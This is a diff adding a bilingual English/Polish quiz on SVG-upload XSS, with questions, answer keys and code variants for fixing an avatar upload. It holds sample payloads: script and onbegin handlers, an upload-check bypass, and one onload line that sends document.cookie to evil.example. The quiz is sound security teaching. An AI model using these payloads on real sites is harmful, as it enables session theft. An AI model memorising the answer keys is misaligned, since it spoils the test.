@@ -1,0 +1,109 @@
+threatId: cat_1_research14
+title:
+  en: SVG Injection — knowledge check
+  pl: SVG Injection — sprawdzian wiedzy
+passScore: 80
+questions:
+- id: q1
+  type: vuln-or-not
+  prompt:
+    en: A malicious SVG containing <script>alert(document.cookie)</script> is referenced with <img src="evil.svg">. Does the script execute?
+    pl: Złośliwy SVG zawierający <script>alert(document.cookie)</script> jest przywoływany przez <img src="evil.svg">. Czy skrypt się wykonuje?
+  isVulnerable: false
+  cwe: CWE-79
+  explanation:
+    en: 'No -- this is the single most-misunderstood fact in this class. The SVG specification mandates a script-free "secure static mode" whenever an SVG is referenced via <img src> (or CSS background-image): no scripts execute, no external resources are fetched. The exact same file would execute its script if rendered inline, through <object>/<embed>/<iframe>, or opened by direct navigation to its URL.'
+    pl: 'Nie -- to najbardziej błędnie rozumiany fakt w tej klasie. Specyfikacja SVG wymusza wolny-od-skryptów "bezpieczny tryb statyczny" gdy tylko SVG jest przywoływane przez <img src> (albo CSS background-image): żadne skrypty się nie wykonują, żadne zewnętrzne zasoby nie są pobierane. Dokładnie ten sam plik wykonałby swój skrypt gdyby był renderowany inline, przez <object>/<embed>/<iframe>, albo otwarty przez bezpośrednią nawigację do jego URL.'
+- id: q2
+  type: vuln-or-not
+  prompt:
+    en: A victim is sent a direct link to an uploaded file at https://app.example/uploads/report.svg, which they open in a new browser tab. The file contains <svg onload="fetch('//evil.example/?c='+document.cookie)"/>. Does this execute in the app's session?
+    pl: Ofierze wysyłany jest bezpośredni link do wgranego pliku pod https://app.example/uploads/report.svg, który otwiera w nowej karcie przeglądarki. Plik zawiera <svg onload="fetch('//evil.example/?c='+document.cookie)"/>. Czy to wykonuje się w sesji aplikacji?
+  isVulnerable: true
+  cwe: CWE-79
+  explanation:
+    en: Yes. Direct top-level navigation to an SVG file makes it the top-level document, fully scripted, in the origin that served it -- exactly the mechanism behind most real WordPress-plugin SVG-upload CVEs, which are typically triggered by "accessing the file via its URL." The onload handler fires immediately on render, stealing the session cookie for app.example.
+    pl: Tak. Bezpośrednia nawigacja najwyższego poziomu do pliku SVG czyni go dokumentem najwyższego poziomu, w pełni skryptowym, w domenie która go serwowała -- dokładnie mechanizm stojący za większością realnych CVE wgrywania SVG w pluginach WordPress, które są zazwyczaj wywoływane przez "dostęp do pliku przez jego URL." Handler onload uruchamia się natychmiast przy renderowaniu, kradnąc ciasteczko sesji dla app.example.
+- id: q3
+  type: multiple-choice
+  prompt:
+    en: A file-upload validator strips any <script> tag from uploaded SVG files but leaves everything else untouched. Which payload from this deep-dive would still work?
+    pl: Walidator uploadu plików usuwa każdy tag <script> z wgrywanych plików SVG ale zostawia wszystko inne nietknięte. Który ładunek z tego deep-dive wciąż by zadziałał?
+  choices:
+  - id: a
+    label:
+      en: <svg xmlns="http://www.w3.org/2000/svg"><animatetransform onbegin="alert(1)" attributeName="transform"/></svg> -- an animation-element event handler that never uses the word "script"
+      pl: <svg xmlns="http://www.w3.org/2000/svg"><animatetransform onbegin="alert(1)" attributeName="transform"/></svg> -- handler zdarzenia elementu animacji który nigdy nie używa słowa "script"
+  - id: b
+    label:
+      en: Nothing -- stripping <script> fully closes every SVG XSS vector
+      pl: Nic -- usunięcie <script> całkowicie zamyka każdy wektor XSS SVG
+  - id: c
+    label:
+      en: A raster PNG image with embedded JavaScript comments
+      pl: Rastrowy obraz PNG z osadzonymi komentarzami JavaScript
+  correctChoiceIds:
+  - a
+  explanation:
+    en: This is exactly the payload PortSwigger's own "Reflected XSS with some SVG markup allowed" lab expects, specifically because event-handler attributes (onload, onerror, onbegin on animation elements) execute independently of the <script> tag and routinely survive filters that only think to block that one construct.
+    pl: To dokładnie ładunek którego oczekuje własne laboratorium PortSwigger "Reflected XSS with some SVG markup allowed", konkretnie dlatego że atrybuty handlerów zdarzeń (onload, onerror, onbegin na elementach animacji) wykonują się niezależnie od tagu <script> i rutynowo przetrwają filtry które myślą tylko o blokowaniu tej jednej konstrukcji.
+- id: q4
+  type: multiple-choice
+  prompt:
+    en: Why does this deep-dive map SVG-upload XSS to both CWE-79 and CWE-434, rather than just CWE-79 like most XSS findings?
+    pl: Dlaczego ten deep-dive mapuje XSS przez upload SVG zarówno do CWE-79 jak i CWE-434, zamiast tylko CWE-79 jak większość znalezisk XSS?
+  choices:
+  - id: a
+    label:
+      en: 'CWE-79 captures the execution outcome (stored XSS), while CWE-434 (Unrestricted Upload of File with Dangerous Type) captures the distinct architectural root cause: accepting a script-capable document format into an image-upload allowlist in the first place'
+      pl: 'CWE-79 uchwytuje wynik wykonania (stored XSS), podczas gdy CWE-434 (Unrestricted Upload of File with Dangerous Type) uchwytuje odrębną przyczynę źródłową architektury: zaakceptowanie formatu dokumentu zdolnego do skryptu w allowliście uploadu obrazów w pierwszej kolejności'
+  - id: b
+    label:
+      en: CWE-434 is a typo and should not actually be included
+      pl: CWE-434 to literówka i w rzeczywistości nie powinno być uwzględnione
+  - id: c
+    label:
+      en: CWE-79 only applies to reflected XSS, never stored XSS
+      pl: CWE-79 dotyczy tylko odbitego XSS, nigdy przechowywanego XSS
+  correctChoiceIds:
+  - a
+  explanation:
+    en: 'All three independent research passes converged on this identical dual mapping: the file-upload delivery mechanism is precisely what distinguishes this class from generic XSS, so documenting both the outcome (CWE-79) and the intake-design failure (CWE-434) gives a more complete picture than either alone.'
+    pl: 'Wszystkie trzy niezależne przejścia badawcze zbiegły się na tym identycznym podwójnym mapowaniu: mechanizm dostarczenia przez upload pliku jest dokładnie tym co odróżnia tę klasę od generycznego XSS, więc udokumentowanie zarówno wyniku (CWE-79) jak i błędu projektowego przyjęcia (CWE-434) daje pełniejszy obraz niż każde z osobna.'
+- id: q5
+  type: vuln-or-not
+  prompt:
+    en: An upload handler checks that the uploaded filename ends in .png and that the client-supplied multipart Content-Type header is image/png, then stores whatever bytes were sent. Is this a genuine attack surface for SVG-based XSS?
+    pl: Handler uploadu sprawdza że nazwa wgrywanego pliku kończy się na .png i że nagłówek Content-Type multipart dostarczony przez klienta to image/png, potem przechowuje jakiekolwiek bajty zostały wysłane. Czy to prawdziwa powierzchnia ataku dla XSS opartego na SVG?
+  isVulnerable: true
+  cwe: CWE-434
+  explanation:
+    en: 'Yes. Both checks trust attacker-controlled values (the filename and the client-supplied header) independently, without ever inspecting the actual bytes. An attacker sends a request named "avatar.png" with Content-Type: image/png but a body containing real SVG markup with an onload handler -- if the server later serves the file based on sniffed or stored content type rather than re-validating, the payload can still reach a scripted rendering context.'
+    pl: 'Tak. Obie kontrole ufają wartościom kontrolowanym przez atakującego (nazwa pliku i nagłówek dostarczony przez klienta) niezależnie, nigdy nie inspekcjonując faktycznych bajtów. Atakujący wysyła żądanie nazwane "avatar.png" z Content-Type: image/png ale z ciałem zawierającym prawdziwy znacznik SVG z handlerem onload -- jeśli serwer później serwuje plik na podstawie wywęszonego albo przechowanego typu treści zamiast ponownej walidacji, ładunek wciąż może dosięgnąć skryptowanego kontekstu renderowania.'
+- id: q6
+  type: pick-the-fix
+  prompt:
+    en: A forum lets users upload a profile avatar as SVG, displayed to every visitor of their profile. Which variant actually fixes the stored-XSS risk?
+    pl: Forum pozwala użytkownikom wgrać awatar profilu jako SVG, wyświetlany każdemu odwiedzającemu ich profil. Który wariant faktycznie naprawia ryzyko stored XSS?
+  variants:
+  - id: v1
+    lang: javascript
+    code: '// strip only the literal substring "<script" before storing
+
+      const clean = svgContent.replace(/<script/gi, "");
+
+      fs.writeFileSync(`./avatars/${userId}.svg`, clean);'
+  - id: v2
+    lang: javascript
+    code: "const DOMPurify = createDOMPurify(new JSDOM('').window);\nconst clean = DOMPurify.sanitize(svgContent,\n  { USE_PROFILES: { svg: true, svgFilters: true } });\nfs.writeFileSync(`./avatars/${userId}.svg`, clean);"
+  - id: v3
+    lang: javascript
+    code: '// only allow SVG files smaller than 10KB
+
+      if (svgContent.length > 10240) throw new Error("file too large");
+
+      fs.writeFileSync(`./avatars/${userId}.svg`, svgContent);'
+  correctVariantId: v2
+  explanation:
+    en: v2 runs the SVG through DOMPurify's dedicated SVG profile, which strips <script>, every event-handler attribute (onload, onerror, onbegin), <foreignObject>, and external references regardless of exact syntax. v1's substring blacklist targets only the literal <script tag and is trivially bypassed by onload/onerror or an animation-element onbegin handler -- exactly the variant this deep-dive shows evading script-only filters; v3's size cap says nothing about content and a working onload payload is well under 10KB.
+    pl: v2 przepuszcza SVG przez dedykowany profil SVG DOMPurify, który usuwa <script>, każdy atrybut handlera zdarzenia (onload, onerror, onbegin), <foreignObject>, i zewnętrzne referencje niezależnie od dokładnej składni. Blacklista podciągu z v1 celuje tylko w dosłowny tag <script i jest trywialnie omijana przez onload/onerror albo handler onbegin elementu animacji -- dokładnie wariant który ten deep-dive pokazuje jako unikający filtrów tylko-script; limit rozmiaru z v3 nic nie mówi o treści, a działający ładunek onload ma dobrze poniżej 10KB.
